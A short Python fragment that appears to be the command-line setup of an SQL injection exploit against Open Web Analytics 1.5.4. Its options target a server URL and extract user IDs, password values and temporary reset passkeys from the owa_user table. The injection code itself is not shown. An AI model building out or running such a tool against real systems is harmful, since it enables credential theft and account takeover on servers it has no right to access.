
import argparse

 
argParser = argparse.ArgumentParser(description='Open Web Analytics v1.5.4 Wicked Awesome SQLi Exploit')

argParser.add_argument("-t", dest="target", help="The target OWA base server URL (e.g. http://owa.example.com/)", required=True)
argParser.add_argument("-o", dest="offset", help="The offset (zero-based) used in the 'LIMIT' portion of the underlying SQL query used to extract column data", type=int, required=True)
argParser.add_argument("-d", dest="dbname", help="The target OWA database name (e.g. 'owa' is the default)", required=False)
argParser.add_argument("-u", dest="user", help="Extract the value of the 'user_id' column from the 'owa_user' table", action='store_true', default=False, required=False)
argParser.add_argument("-p", dest="password", help="Extract the value of the 'password' column from the 'owa_user' table", action='store_true', default=False, required=False)
argParser.add_argument("-r", dest="passkey", help="Extract the value of the 'temp_passkey' column from the 'owa_user' table", action='store_true', default=False, required=False)
 
args = argParser.parse_args()

